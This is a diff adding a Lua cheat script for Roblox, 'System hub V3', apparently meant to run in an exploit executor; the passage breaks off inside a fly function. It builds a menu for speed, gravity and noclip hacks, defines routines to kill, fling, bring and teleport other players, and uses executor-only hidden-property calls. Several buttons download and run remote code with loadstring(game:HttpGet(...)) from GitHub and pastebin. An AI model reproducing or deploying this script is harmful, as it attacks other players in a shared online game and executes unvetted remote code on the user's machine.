@@ -1,0 +1,6131 @@
+if not game:IsLoaded() then
+  game:IsLoaded():Wait()
+end
+
+local A  = "                                " 
+local A1 = "░██████╗██╗░░░██╗░██████╗████████╗███████╗███╗░░░███╗  ██╗░░██╗██╗░░░██╗██████╗░  ██╗░░░██╗██████╗░"
+local A2 = "██╔════╝╚██╗░██╔╝██╔════╝╚══██╔══╝██╔════╝████╗░████║  ██║░░██║██║░░░██║██╔══██╗  ██║░░░██║╚════██╗"
+local A3 = "╚█████╗░░╚████╔╝░╚█████╗░░░░██║░░░█████╗░░██╔████╔██║  ███████║██║░░░██║██████╦╝  ╚██╗░██╔╝░█████╔╝"
+local A4 = "░╚═══██╗░░╚██╔╝░░░╚═══██╗░░░██║░░░██╔══╝░░██║╚██╔╝██║  ██╔══██║██║░░░██║██╔══██╗  ░╚████╔╝░░╚═══██╗"
+local A5 = "██████╔╝░░░██║░░░██████╔╝░░░██║░░░███████╗██║░╚═╝░██║  ██║░░██║╚██████╔╝██████╦╝  ░░╚██╔╝░░██████╔╝"
+local A6 = "╚═════╝░░░░╚═╝░░░╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░░░░╚═╝  ╚═╝░░╚═╝░╚═════╝░╚═════╝░  ░░░╚═╝░░░╚═════╝░"
+
+print ("------------------------------------------------------"..A,A1,A2,A3,A4,A5,A6,A)
+
+local placeId = game.PlaceId
+local placeInfo = game:GetService("MarketplaceService"):GetProductInfo(placeId)
+local placeName = placeInfo.Name
+local Country = game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(game.Players.LocalPlayer)
+
+
+local speaker = game.Players.LocalPlayer
+local plr = game.Players.LocalPlayer
+local playerlp = plr
+local Characterlp = plr.Character
+local Area = game:GetService("Workspace")
+local players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UIS = game:GetService("UserInputService")
+local coregui = game:GetService("CoreGui")
+local Mouse = plr:GetMouse()
+local MyView = Area.CurrentCamera
+local MyTeamColor = plr.TeamColor
+local HoldingM2 = false
+local Active = false
+local Lock = false
+local Epitaph = .187 
+local HeadOffset = Vector3.new(0, .1, 0)
+Players = game:GetService("Players")
+IYMouse = Players.LocalPlayer:GetMouse()
+UserInputService = game:GetService("UserInputService")
+autoclicking = false
+local WalkTo = false
+local Guarding = false
+local Flinging = false
+local Platformstand = false
+local viewing = nil
+local Control = false
+local Lagging = false
+local AutoObby = false
+local invisRunning = false
+local IsInvis = false
+local IsRunning = true
+local invisFix
+local invisDied
+local InvisibleCharacter
+local CF
+local Clip = true
+local Regulars = false
+local vnoclipParts = {}
+local FlingTBL = {}
+local frozenParts = {}
+local vfreeze = {}
+local RestoreCFling = {}
+local shownParts = {}
+local showninParts = {}
+local showninvParts = {}
+local shownvisParts = {}
+local vstrongParts = {}
+local vweakParts = {}
+local highlights = {}
+local workspace = game.Workspace
+local Noclipping = nil
+local viewDied
+local viewChanged
+local triggermd
+local triggermp
+local cancelAutoClick
+local highlight
+local highlight2
+local closesttouch = nil
+local closestclick = nil
+local closestprox = nil
+local closestseat = nil
+local lockcursorman
+local unlockcursorman
+local fakekicktbl
+CFloop = nil
+CFspeed = 50
+simRadius = false
+FLYING = false
+QEfly = true
+NOWW = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").WalkSpeed
+NOWJ = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").JumpPower
+NOWG = game.Workspace.Gravity
+NOWH = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").HipHeight
+iyflyspeed = 1
+PlayerVolumeBELIKE = UserSettings():GetService("UserGameSettings").MasterVolume
+PlayerGraphicsBELIKE = settings().Rendering.QualityLevel
+vehicleflyspeed = 1
+local HumanModCons = {}
+local flyjump
+local simRadLoop
+local stareLoop
+local currentToolSize = ""
+local currentGripPos = ""
+local invisRunning = false
+local noSit
+local nositDied
+local proxDied = nil
+local clickDied = nil
+local selclick = nil
+local seltouch = nil
+local selprox = nil
+local selseat = nil
+local selinvisp = nil
+local selcanc = nil
+local YesRefresh = false
+local sethidden = sethiddenproperty or set_hidden_property or set_hidden_prop
+local setsimulation = setsimulationradius or set_simulation_radius
+PlaceId, JobId = game.PlaceId, game.JobId
+ local Players = game:GetService("Players")
+ local UserInputService = game:GetService("UserInputService")
+ local TweenService = game:GetService("TweenService")
+ local RunService = game:GetService("RunService")
+ local TeleportService = game:GetService("TeleportService")
+ local RunService2 = game:FindService("RunService")
+ local StarterGui = game:GetService("StarterGui")
+ local SoundService = game:GetService("SoundService")
+ sethidden = sethiddenproperty or set_hidden_property or set_hidden_prop
+ local Player = game.Players.LocalPlayer
+ local IYLOADED = false -- This is used for the ;iy command that executes infinite yield commands using this admin command script (BTW)
+ local Humanoid = Character and Character:FindFirstChildWhichIsA("Humanoid") or false
+ local Character = game.Players.LocalPlayer.Character
+ local Clicked = true
+ _G.Spam = false
+ view = false
+ anniblockspam = false
+ control = false
+ FakeLag = false
+ Loopvoid = false
+ Loopkill = false
+ Loopbring = false
+ Loopbanish = false
+ Loopvoid = false
+ Loopcuff = false
+ loopgrab = false
+ Loopstand = false
+ Looptornado = false
+ Loopmute = false
+ Loopglitch = false
+ Watch = false
+ local Admin = {}
+local localPlayer = Players.LocalPlayer
+ local LocalPlayer = Players.LocalPlayer
+ local character = localPlayer.Character
+ local mouse = localPlayer:GetMouse()
+ local camera = workspace.CurrentCamera
+ local camtype = camera.CameraType
+ player, plr, lp = localPlayer, localPlayer, localPlayer, localPlayer
+ 
+ localPlayer.CharacterAdded:Connect(function(c)
+	 character = c
+ end)
+ 
+ local function getBp()
+	 return game.Players.LocalPlayer.Backpack
+ end
+ 
+ local plr = game.Players.LocalPlayer
+
+ 
+ workspace = game.workspace
+ 
+ cmdm = plr:GetMouse()
+
+function round(num, numDecimalPlaces)
+  local mult = 10 ^ (numDecimalPlaces or 0)
+  return math.floor(num * mult + 0.5) / mult
+end
+
+function getRoot(char)
+  local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or
+      char:FindFirstChild('UpperTorso')
+  return rootPart
+end
+
+function SimRad()
+  if sethidden then
+    simRadLoop = game:GetService('RunService').Stepped:Connect(function()
+      if setsimulation then
+        setsimulation(1e308, 1 / 0)
+      else
+        sethidden(plr, "MaximumSimulationRadius", 1 / 0)
+        sethidden(plr, "SimulationRadius", 1e308)
+      end
+    end)
+    simRadius = true
+  end
+end
+
+local function getChar()
+	 return game.Players.LocalPlayer.Character
+ end
+
+function toClipboard(String)
+  local clipBoard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
+  if clipBoard then
+    clipBoard(String)
+  end
+end
+
+local function CursorLock()
+  UIS.MouseBehavior = Enum.MouseBehavior.LockCenter
+end
+
+local function UnLockCursor()
+  HoldingM2 = false
+  Active = false
+  Lock = false
+  UIS.MouseBehavior = Enum.MouseBehavior.Default
+end
+
+function FindNearestPlayer()
+  local dist = math.huge
+  local Target = nil
+  for _, v in pairs(game.Players:GetPlayers()) do
+    if v ~= plr and v.Character:FindFirstChildOfClass("Humanoid") and
+        v.Character:FindFirstChildOfClass("Humanoid").Health > 0 and getRoot(v.Character) and v then
+      local TheirCharacter = v.Character
+      local CharacterRoot, Visible = MyView:WorldToViewportPoint(getRoot(TheirCharacter).Position)
+      if Visible then
+        local RealMag = (Vector2.new(Mouse.X, Mouse.Y) - Vector2.new(CharacterRoot.X, CharacterRoot.Y)).Magnitude
+        if RealMag < dist and RealMag < FOVCircle.Radius then
+          dist = RealMag
+          Target = TheirCharacter
+        end
+      end
+    end
+  end
+  return Target
+end
+
+function Noclip()
+  Clip = false
+  function NoclipLoop()
+    if Clip == false and plr.Character ~= nil then
+      for _, child in pairs(plr.Character:GetDescendants()) do
+        if child:IsA("BasePart") and child.CanCollide == true then
+          child.CanCollide = false
+        end
+      end
+    end
+  end
+
+  Noclipping = game:GetService('RunService').Stepped:connect(NoclipLoop)
+end
+
+function TurnsVisible()
+  if IsInvis == false then return end
+  invisFix:Disconnect()
+  invisDied:Disconnect()
+  CF = game.Workspace.CurrentCamera.CFrame
+  Characterlp = Characterlp
+  local CF_1 = playerlp.Character.HumanoidRootPart.CFrame
+  Characterlp.HumanoidRootPart.CFrame = CF_1
+  InvisibleCharacter:Destroy()
+  playerlp.Character = Characterlp
+  Characterlp.Parent = workspace
+  IsInvis = false
+  playerlp.Character.Animate.Disabled = true
+  playerlp.Character.Animate.Disabled = false
+  invisDied = Characterlp:FindFirstChildOfClass 'Humanoid'.Died:Connect(function()
+    invisRespawn()
+    invisDied:Disconnect()
+  end)
+  invisRunning = false
+end
+
+function invisRespawn()
+  IsRunning = false
+  if IsInvis == true then
+    pcall(function()
+      playerlp.Character = Characterlp
+      wait()
+      Characterlp.Parent = game.Workspace
+      Characterlp:FindFirstChildWhichIsA 'Humanoid':Destroy()
+      IsInvis = false
+      InvisibleCharacter.Parent = nil
+      invisRunning = false
+    end)
+  elseif IsInvis == false then
+    pcall(function()
+      playerlp.Character = Characterlp
+      wait()
+      Characterlp.Parent = game.Workspace
+      Characterlp:FindFirstChildWhichIsA 'Humanoid':Destroy()
+      TurnsVisible()
+    end)
+  end
+end
+
+function TurnVisible()
+  if IsInvis == false then return end
+  invisFix:Disconnect()
+  invisDied:Disconnect()
+  CF = game.Workspace.CurrentCamera.CFrame
+  Characterlp = Characterlp
+  local CF_1 = playerlp.Character.HumanoidRootPart.CFrame
+  Characterlp.HumanoidRootPart.CFrame = CF_1
+  InvisibleCharacter:Destroy()
+  playerlp.Character = Characterlp
+  Characterlp.Parent = workspace
+  IsInvis = false
+  playerlp.Character.Animate.Disabled = true
+  playerlp.Character.Animate.Disabled = false
+  invisDied = Characterlp:FindFirstChildOfClass 'Humanoid'.Died:Connect(function()
+    invisRespawn()
+    invisDied:Disconnect()
+  end)
+  invisRunning = false
+end
+
+function fixcam()
+  game.Workspace.CurrentCamera:Remove()
+  wait(.1)
+  repeat wait() until plr.Character ~= nil
+  game.Workspace.CurrentCamera.CameraSubject = plr.Character:FindFirstChildWhichIsA('Humanoid')
+  game.Workspace.CurrentCamera.CameraType = "Custom"
+  plr.CameraMinZoomDistance = 0.5
+  plr.CameraMaxZoomDistance = 400
+  plr.CameraMode = "Classic"
+  plr.Character.Head.Anchored = false
+end
+
+function respawn(plr)
+  if invisRunning then TurnVisible() end
+  local char = plr.Character
+  if char:FindFirstChildOfClass("Humanoid") then char:FindFirstChildOfClass("Humanoid"):ChangeState(15) end
+  char:ClearAllChildren()
+  local newChar = Instance.new("Model")
+  newChar.Parent = workspace
+  plr.Character = newChar
+  wait()
+  plr.Character = char
+  newChar:Destroy()
+end
+
+function refresh(plr)
+  local Human = plr.Character and plr.Character:FindFirstChildOfClass("Humanoid", true)
+  local pos = Human and Human.RootPart and Human.RootPart.CFrame
+  local pos1 = game.Workspace.CurrentCamera.CFrame
+  respawn(plr)
+  task.spawn(function()
+    speaker.CharacterAdded:Wait():WaitForChild("Humanoid").RootPart.CFrame, workspace.CurrentCamera.CFrame = pos,
+        wait() and pos1
+  end)
+end
+
+function tools(plr)
+  if plr:FindFirstChildOfClass("Backpack"):FindFirstChildOfClass('Tool') or plr.Character:FindFirstChildOfClass('Tool') then
+    return true
+  end
+end
+
+function attach(speaker, target)
+  if tools(speaker) then
+    local char = speaker.Character
+    local tchar = target.Character
+    local hum = speaker.Character:FindFirstChildOfClass("Humanoid")
+    local hrp = getRoot(speaker.Character)
+    local hrp2 = getRoot(target.Character)
+    hum.Name = "1"
+    local newHum = hum:Clone()
+    newHum.Parent = char
+    newHum.Name = "Humanoid"
+    wait()
+    hum:Destroy()
+    game.Workspace.CurrentCamera.CameraSubject = char
+    newHum.DisplayDistanceType = "None"
+    local tool = speaker:FindFirstChildOfClass("Backpack"):FindFirstChildOfClass("Tool") or
+        speaker.Character:FindFirstChildOfClass("Tool")
+    tool.Parent = char
+    hrp.CFrame = hrp2.CFrame * CFrame.new(0, 0, 0) *
+        CFrame.new(math.random(-100, 100) / 200, math.random(-100, 100) / 200, math.random(-100, 100) / 200)
+    local n = 0
+    repeat
+      wait(.1)
+      n = n + 1
+      hrp.CFrame = hrp2.CFrame
+    until (tool.Parent ~= char or not hrp or not hrp2 or not hrp.Parent or not hrp2.Parent or n > 250) and n > 2
+  else
+    game.StarterGui:SetCore("SendNotification",
+      { Title = "Warning!", Text = "You need to have an item in backpack to execute this script.", Duration = 4, })
+  end
+end
+
+function bring(speaker, target, fast)
+  if tools(speaker) then
+    if target ~= nil then
+      local NormPos = getRoot(speaker.Character).CFrame
+      if not fast then
+        refresh(speaker)
+        wait()
+        repeat wait() until speaker.Character ~= nil and getRoot(speaker.Character)
+        wait(0.3)
+      end
+      local hrp = getRoot(speaker.Character)
+      attach(speaker, target)
+      repeat
+        wait()
+        hrp.CFrame = NormPos
+      until not getRoot(target.Character) or not getRoot(speaker.Character)
+      wait(1)
+      plr.CharacterAdded:Wait():WaitForChild("HumanoidRootPart").CFrame = NormPos
+    end
+  else
+    game.StarterGui:SetCore("SendNotification",
+      { Title = "Warning!", Text = "You need to have an item in backpack to execute this script.", Duration = 4, })
+  end
+end
+
+function kill(speaker, target, fast)
+  if tools(speaker) then
+    if target ~= nil then
+      local NormPos = getRoot(speaker.Character).CFrame
+      if not fast then
+        refresh(speaker)
+        wait()
+        repeat wait() until speaker.Character ~= nil and getRoot(speaker.Character)
+        wait(0.3)
+      end
+      local hrp = getRoot(speaker.Character)
+      attach(speaker, target)
+      repeat
+        wait()
+        hrp.CFrame = CFrame.new(999999, workspace.FallenPartsDestroyHeight + 5, 999999)
+      until not getRoot(target.Character) or not getRoot(speaker.Character)
+      wait(1)
+      speaker.CharacterAdded:Wait():WaitForChild("HumanoidRootPart").CFrame = NormPos
+    end
+  else
+    game.StarterGui:SetCore("SendNotification",
+      { Title = "Warning!", Text = "You need to have an item in backpack to execute this script.", Duration = 4, })
+  end
+end
+
+function teleport(speaker, target, target2, fast)
+  if tools(speaker) then
+    if target ~= nil then
+      local NormPos = getRoot(speaker.Character).CFrame
+      if not fast then
+        refresh(speaker)
+        wait()
+        repeat wait() until speaker.Character ~= nil and getRoot(speaker.Character)
+        wait(0.3)
+      end
+      local hrp = getRoot(speaker.Character)
+      local hrp2 = getRoot(target2.Character)
+      attach(speaker, target)
+      repeat
+        wait()
+        hrp.CFrame = hrp2.CFrame
+      until not getRoot(target.Character) or not getRoot(speaker.Character)
+      wait(1)
+      speaker.CharacterAdded:Wait():WaitForChild("HumanoidRootPart").CFrame = NormPos
+    end
+  else
+    game.StarterGui:SetCore("SendNotification",
+      { Title = "Warning!", Text = "You need to have an item in backpack to execute this script.", Duration = 4, })
+  end
+end
+
+
+
+function GetNPC(String)
+  local FoundNPC = {}
+  local strl = String:lower()
+  for i, v in pairs(game.Workspace:GetDescendants()) do do
+      if v:IsA("Model") and v.Name:lower():sub(1, #String) == String:lower() then
+        table.insert(FoundNPC, v)
+      end
+    end
+  end
+  return FoundNPC
+end
+
+local function align(part0, part1)
+  local attachment0 = Instance.new("Attachment", part1)
+  local attachment1 = Instance.new("Attachment", part0)
+
+  local alignpos = Instance.new("AlignPosition", part0)
+  alignpos.MaxForce = math.huge
+  alignpos.Responsiveness = 200
+  alignpos.Attachment0 = attachment0
+  alignpos.Attachment1 = attachment1
+end
+
+local function fling(part0)
+  local vel = Instance.new("BodyAngularVelocity", part0)
+  vel.AngularVelocity = Vector3.new(1, 1, 1) * 999
+  vel.MaxTorque = Vector3.new(1, 1, 1) * 9999
+end
+
+local function loadcharacter(character)
+  local scf = character.HumanoidRootPart.CFrame
+  character.HumanoidRootPart.CFrame = scf * CFrame.new(0, 100, 0)
+  character.HumanoidRootPart.Anchored = true
+
+  wait(1)
+
+  local fakec = Instance.new("Model", workspace)
+
+  local froot = Instance.new("Part", fakec)
+  froot.Name = "HumanoidRootPart"
+  froot.Size = Vector3.new(1, 5, 1)
+  froot.CFrame = scf
+  froot.Transparency = 0.5
+
+  Instance.new("Humanoid", fakec)
+
+  plr.Character = fakec
+  workspace.CurrentCamera.CameraSubject = fakec.Humanoid
+
+  align(froot, character.HumanoidRootPart)
+
+  character.Humanoid:Destroy()
+
+  for _, p in pairs(character:GetDescendants()) do
+    if p:IsA("BasePart") then
+      p.CanCollide = false
+      p.Massless = true
+    elseif p:IsA("BodyGyro") or p:IsA("BodyAngularVelocity") or p:IsA("BodyVelocity") then
+      p:Destroy()
+    end
+  end
+
+  game.RunService.Heartbeat:Connect(function()
+    for _, p in pairs(character:GetDescendants()) do
+      if p:IsA("BasePart") then
+        p.CanCollide = false
+        p.Massless = true
+        p.Anchored = false
+      elseif p:IsA("Weld") then
+        p.Enabled = false
+      end
+    end
+  end)
+
+
+  wait()
+
+  wait(1)
+  fling(character.HumanoidRootPart)
+end
+
+plr = game.Players.LocalPlayer
+ COREGUI = game:GetService("CoreGui")
+ speaker = game.Players.LocalPlayer
+ char = plr.Character
+ RunService = game:GetService("RunService")
+ 
+ game:GetService('RunService').Stepped:connect(function()
+ if anniblockspam then
+ game.workspace.Tools.Chest_Invisibility_Cloak.Part.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position)
+ 
+ if game.Players.LocalPlayer.Backpack:FindFirstChild("InvisibilityCloak") then
+ game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.InvisibilityCloak)
+ end
+ 
+ for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+ if (v:IsA("Tool")) then
+ v.Handle.Mesh:Destroy()
+ end
+ end
+ 
+ for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+ if (v:IsA("Tool")) then
+ v.Parent = workspace
+ end
+ end
+ 
+ end
+ end)
+
+local getPlr = function(Name)
+	 if Name:lower() == "random" then
+		 return Players:GetPlayers()[math.random(#Players:GetPlayers())]
+	 else
+		 Name = Name:lower():gsub("%s", "")
+		 for _, x in next, Players:GetPlayers() do
+			 if x.Name:lower():match(Name) then
+				 return x
+			 elseif x.DisplayName:lower():match("^" .. Name) then
+				 return x
+			 end
+		 end
+	 end
+ end
+ 
+
+ argument = {}
+ argument.getPlayers = function(str)
+   local playerNames, players = lib.parseText(str, opt.tupleSeparator), {}
+   for _, arg in pairs(playerNames or {"me"}) do
+     arg = arg:lower()
+     local playerList = Players:GetPlayers()
+     if arg == "me" or arg == nil then
+       table.insert(players, localPlayer)
+
+     elseif arg == "all" then
+       for _, plr in pairs(playerList) do
+         table.insert(players, plr)
+       end
+
+     elseif arg == "others" then
+       for _, plr in pairs(playerList) do
+         if plr ~= localPlayer then
+           table.insert(players, plr)
+         end
+       end
+
+     elseif arg == "random" then
+       table.insert(players, playerList[math.random(1, #playerList)])
+
+     elseif arg:find("%%") == 1 then
+       local teamName = arg:sub(2)
+       for _, plr in pairs(playerList) do
+         if tostring(plr.Team):lower():find(teamName) == 1 then
+           table.insert(players, plr)
+         end
+       end
+
+     else
+       for _, plr in pairs(playerList) do
+         if plr.Name:lower():find(arg) == 1 or (plr.DisplayName and plr.DisplayName:lower():find(arg) == 1) or (tostring(plr.UserId):lower():find(arg) == 1) then
+           table.insert(players, plr)
+         end
+       end
+     end
+   end
+   return players
+ end
+
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/thanhdat4461/OrionMoblie/main/source')))()
+
+OrionLib:MakeNotification({
+  Name = "Thanks for using System hub",
+  Content = "Made by AAAAA999l999",
+  Image = "rbxassetid://6026568227",
+  Time = 10
+})
+
+local Window = OrionLib:MakeWindow({Name = "⚠️⚠️🔞🔞System hub V3🔞🔞⚠️⚠️",IntroText = "Loading..."})
+
+local Tab = Window:MakeTab({
+  Name = "Player",
+  Icon = "rbxassetid://6023426915",
+  PremiumOnly = false
+})
+Tab:AddTextbox({
+  Name = "🏃‍♂️WalkSpeed🏃‍♂️",
+  Default = "",
+  TextDisappear = true,
+  Callback = function(txt)
+    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = txt
+  end	  
+})
+Tab:AddButton({
+  Name = "🏃‍♂️Reset WalkSpeed🏃‍♂️",
+  Callback = function()
+          game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
+    end    
+})
+Tab:AddTextbox({
+  Name = "🏃‍♂️JumpPower🏃‍♂️",
+  Default = "",
+  TextDisappear = true,
+  Callback = function(txt)
+    game.Players.LocalPlayer.Character.Humanoid.JumpPower = txt
+  end	  
+})
+Tab:AddButton({
+  Name = "Reset JumpPower",
+  Callback = function()
+          game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
+    end    
+})
+Tab:AddTextbox({
+  Name = "Gravity",
+  Default = "",
+  TextDisappear = true,
+  Callback = function(txt)
+    workspace.Gravity = txt
+  end	   
+})
+Tab:AddButton({
+  Name = "Reset Gravity",
+  Callback = function()
+          workspace.Gravity = 192.6
+    end    
+})
+Tab:AddTextbox({
+  Name = "Hipheight",
+  Default = "",
+  TextDisappear = true,
+  Callback = function(txt)
+    game.Players.LocalPlayer.Character.Humanoid.HipHeight = txt
+  end	  
+})
+Tab:AddButton({
+  Name = "Reset Hipheight",
+  Callback = function()
+    game.Players.LocalPlayer.Character.Humanoid.HipHeight = 1
+    end    
+})
+Tab:AddTextbox({
+  Name = "Fov",
+  Default = "",
+  TextDisappear = true,
+  Callback = function(txt)
+    game.Workspace.CurrentCamera.FieldOfView = txt
+  end	  
+})
+Tab:AddButton({
+  Name = "Reset Fov",
+  Callback = function()
+          game.Workspace.CurrentCamera.FieldOfView = 70
+    end    
+})
+
+Tab:AddTextbox({
+    Name = "Spin",
+    Default = "",
+    TextDisappear = true,
+    Callback = function(txt)
+        spinSpeed = txt
+        for i,v in pairs(getRoot(game.Players.LocalPlayer.Character):GetChildren()) do
+            if v.Name == "Spinning" then
+                v:Destroy()
+            end
+        end
+        local Spin = Instance.new("BodyAngularVelocity")
+        Spin.Name = "Spinning"
+        Spin.Parent = getRoot(speaker.Character)
+        Spin.MaxTorque = Vector3.new(0, math.huge, 0)
+        Spin.AngularVelocity = Vector3.new(0,spinSpeed,0)
+    end	  
+})
+
+Tab:AddButton({
+    Name = "Unspin",
+    Callback = function()
+        function getRoot(char)
+            local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
+            return rootPart
+        end
+
+        for i,v in pairs(getRoot(game.Players.LocalPlayer.Character):GetChildren()) do
+            if v.Name == "Spinning" then
+                v:Destroy()
+            end
+        end 		
+    end    
+})
+
+Tab:AddButton({
+  Name = "Reset All",
+  Callback = function()
+        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
+      game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
+      workspace.Gravity = 192.6
+      game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").HipHeight = 1
+      game.Workspace.CurrentCamera.FieldOfView = 70
+      
+    end   
+})
+
+Tab:AddButton({
+	Name = "rejoin",
+	Callback = function()
+      game:GetService("TeleportService"):Teleport(game.PlaceId)		
+  	end    
+})
+
+local Section = Tab:AddSection({
+  Name = "Player scripts"
+})
+
+Tab:AddButton({
+  Name = "God Mode",
+  Callback = function()
+        loadstring(game:HttpGet(('https://pastebin.com/raw/bbyuynM1'),true))()
+    end    
+})
+
+Tab:AddButton({
+  Name = "unAnchored Parts to You",
+  Callback = function()
+        if sethidden then
+      local Forces = {}
+      for _,part in pairs(game.Workspace:GetDescendants()) do
+        if game.Players.LocalPlayer.Character:FindFirstChild("Head") and part:IsA("BasePart" or "UnionOperation" or "Model") and part.Anchored == false and not part:IsDescendantOf(plr.Character) and part.Name == "Torso" == false and part.Name == "Head" == false and part.Name == "Right Arm" == false and part.Name == "Left Arm" == false and part.Name == "Right Leg" == false and part.Name == "Left Leg" == false and part.Name == "HumanoidRootPart" == false then
+          for i,c in pairs(part:GetChildren()) do
+            if c:IsA("BodyPosition") or c:IsA("BodyGyro") then
+              c:Destroy()
+            end
+          end
+          local ForceInstance = Instance.new("BodyPosition")
+          ForceInstance.Parent = part
+          ForceInstance.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+          table.insert(Forces, ForceInstance)
+          if not table.find(frozenParts,part) then
+            table.insert(frozenParts,part)
+          end
+        end
+      end
+      if not simRadius then
+        SimRad()
+      end
+      for i,c in pairs(Forces) do
+        c.Position = plr.Character.Head.Position
+      end
+    end
+  end    
+})
+
+Tab:AddButton({
+	Name = "full bright",
+	Callback = function()
+      	 if not _G.FullBrightExecuted then
+ 
+		 _G.FullBrightEnabled = false
+	 
+		 _G.NormalLightingSettings = {
+			 Brightness = game:GetService("Lighting").Brightness,
+			 ClockTime = game:GetService("Lighting").ClockTime,
+			 FogEnd = game:GetService("Lighting").FogEnd,
+			 GlobalShadows = game:GetService("Lighting").GlobalShadows,
+			 Ambient = game:GetService("Lighting").Ambient
+		 }
+	 
+		 game:GetService("Lighting"):GetPropertyChangedSignal("Brightness"):Connect(function()
+			 if game:GetService("Lighting").Brightness ~= 1 and game:GetService("Lighting").Brightness ~= _G.NormalLightingSettings.Brightness then
+				 _G.NormalLightingSettings.Brightness = game:GetService("Lighting").Brightness
+				 if not _G.FullBrightEnabled then
+					 repeat
+						 wait()
+					 until _G.FullBrightEnabled
+				 end
+				 game:GetService("Lighting").Brightness = 1
+			 end
+		 end)
+	 
+		 game:GetService("Lighting"):GetPropertyChangedSignal("ClockTime"):Connect(function()
+			 if game:GetService("Lighting").ClockTime ~= 12 and game:GetService("Lighting").ClockTime ~= _G.NormalLightingSettings.ClockTime then
+				 _G.NormalLightingSettings.ClockTime = game:GetService("Lighting").ClockTime
+				 if not _G.FullBrightEnabled then
+					 repeat
+						 wait()
+					 until _G.FullBrightEnabled
+				 end
+				 game:GetService("Lighting").ClockTime = 12
+			 end
+		 end)
+	 
+		 game:GetService("Lighting"):GetPropertyChangedSignal("FogEnd"):Connect(function()
+			 if game:GetService("Lighting").FogEnd ~= 786543 and game:GetService("Lighting").FogEnd ~= _G.NormalLightingSettings.FogEnd then
+				 _G.NormalLightingSettings.FogEnd = game:GetService("Lighting").FogEnd
+				 if not _G.FullBrightEnabled then
+					 repeat
+						 wait()
+					 until _G.FullBrightEnabled
+				 end
+				 game:GetService("Lighting").FogEnd = 786543
+			 end
+		 end)
+	 
+		 game:GetService("Lighting"):GetPropertyChangedSignal("GlobalShadows"):Connect(function()
+			 if game:GetService("Lighting").GlobalShadows ~= false and game:GetService("Lighting").GlobalShadows ~= _G.NormalLightingSettings.GlobalShadows then
+				 _G.NormalLightingSettings.GlobalShadows = game:GetService("Lighting").GlobalShadows
+				 if not _G.FullBrightEnabled then
+					 repeat
+						 wait()
+					 until _G.FullBrightEnabled
+				 end
+				 game:GetService("Lighting").GlobalShadows = false
+			 end
+		 end)
+	 
+		 game:GetService("Lighting"):GetPropertyChangedSignal("Ambient"):Connect(function()
+			 if game:GetService("Lighting").Ambient ~= Color3.fromRGB(178, 178, 178) and game:GetService("Lighting").Ambient ~= _G.NormalLightingSettings.Ambient then
+				 _G.NormalLightingSettings.Ambient = game:GetService("Lighting").Ambient
+				 if not _G.FullBrightEnabled then
+					 repeat
+						 wait()
+					 until _G.FullBrightEnabled
+				 end
+				 game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)
+			 end
+		 end)
+	 
+		 game:GetService("Lighting").Brightness = 1
+		 game:GetService("Lighting").ClockTime = 12
+		 game:GetService("Lighting").FogEnd = 786543
+		 game:GetService("Lighting").GlobalShadows = false
+		 game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)
+	 
+		 local LatestValue = true
+		 spawn(function()
+			 repeat
+				 wait()
+			 until _G.FullBrightEnabled
+			 while wait() do
+				 if _G.FullBrightEnabled ~= LatestValue then
+					 if not _G.FullBrightEnabled then
+						 game:GetService("Lighting").Brightness = _G.NormalLightingSettings.Brightness
+						 game:GetService("Lighting").ClockTime = _G.NormalLightingSettings.ClockTime
+						 game:GetService("Lighting").FogEnd = _G.NormalLightingSettings.FogEnd
+						 game:GetService("Lighting").GlobalShadows = _G.NormalLightingSettings.GlobalShadows
+						 game:GetService("Lighting").Ambient = _G.NormalLightingSettings.Ambient
+					 else
+						 game:GetService("Lighting").Brightness = 1
+						 game:GetService("Lighting").ClockTime = 12
+						 game:GetService("Lighting").FogEnd = 786543
+						 game:GetService("Lighting").GlobalShadows = false
+						 game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)
+					 end
+					 LatestValue = not LatestValue
+				 end
+			 end
+		 end)
+	 end
+	 
+	 _G.FullBrightExecuted = true
+	 _G.FullBrightEnabled = not _G.FullBrightEnabled	
+  	end   
+})
+
+function sFLY(vfly)
+  repeat wait() until Players.LocalPlayer and Players.LocalPlayer.Character and Players.LocalPlayer.Character.HumanoidRootPart and Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+  repeat wait() until IYMouse
+  if flyKeyDown or flyKeyUp then flyKeyDown:Disconnect() flyKeyUp:Disconnect() end
+
+  local T = Players.LocalPlayer.Character.HumanoidRootPart
+  local CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
+  local lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
+  local SPEED = 0
+
+  local function FLY()
+    FLYING = true
+    local BG = Instance.new('BodyGyro')
+    local BV = Instance.new('BodyVelocity')
+    BG.P = 9e4
+    BG.Parent = T
+    BV.Parent = T
+    BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
+    BG.cframe = T.CFrame
+    BV.velocity = Vector3.new(0, 0, 0)
+    BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
+    task.spawn(function()
+      repeat wait()
